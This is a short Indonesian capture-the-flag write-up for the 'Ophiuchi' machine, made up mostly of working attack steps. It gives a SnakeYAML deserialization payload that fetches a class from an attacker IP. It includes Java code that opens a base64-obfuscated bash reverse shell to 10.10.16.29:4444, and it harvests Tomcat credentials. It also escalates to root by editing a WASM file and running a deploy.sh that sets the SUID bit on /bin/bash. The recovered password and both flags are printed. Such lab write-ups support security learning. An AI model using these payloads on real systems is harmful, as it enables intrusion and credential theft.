# Ophiuchi

https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858

https://github.com/artsploit/yaml-payload

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[!!java.net.URL ["http://10.10.16.29:8089/"]]],
]
```

pada file yaml-payload jalankan

```
javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ .
```

pada file Awesomescriptengine ganti exec jadi seperti ini

```java
String cmd = "bash -i >& /dev/tcp/10.10.16.29/4444 0>&1"; 

String b64Cmd = Base64.getEncoder().encodeToString(cmd.getBytes());
cmd = "bash -c {echo,"+b64Cmd+"}|{base64,-d}|{bash,-i}";
Runtime.getRuntime().exec(cmd);
```

setelah semuanya siap tinggal di compile dan jalankan server kita. lalu panggil dengan payload pertama dan dapat reverse shell. setelah dapat shell jalankan `cat ~/conf/tomcat-users.xml` untuk melihat list user

cred `<user username="admin" password="whythereisalimit" roles="manager-gui,admin-gui"/>`

flag user :15c229efbe67f1909d14375e12a92103

Menjalankan sudo -l didapati user bisa run privesc dengan menjalana sebuah file go.

```go
package main

import (
        "fmt"
        wasm "github.com/wasmerio/wasmer-go/wasmer"
        "os/exec"
        "log"
)


func main() {
        bytes, _ := wasm.ReadBytes("main.wasm")

        instance, _ := wasm.NewInstance(bytes)
        defer instance.Close()
        init := instance.Exports["info"]
        result,_ := init()
        f := result.String()
        if (f != "1") {
                fmt.Println("Not ready to deploy")
        } else {
                fmt.Println("Ready to deploy")
                out, err := exec.Command("/bin/sh", "deploy.sh").Output()
                if err != nil {
                        log.Fatal(err)
                }
                fmt.Println(string(out))
        }
}
```

Dari sini kita download file main.wasm nya dan dengan bantuan tools https://github.com/WebAssembly/wabt kita coba rubah binary file mainnya supaya bisa menjalankan file deploy.sh dan juga kita membuat file deploy.sh yang berisi chmod +s /bin/bash lalu jalankan sudo go run /opt/wasm-functions/index.go , lalu jalankan bash -p dan kita sudah dalam root group

flag root : f3c2a278e676beba114751dc93e5908b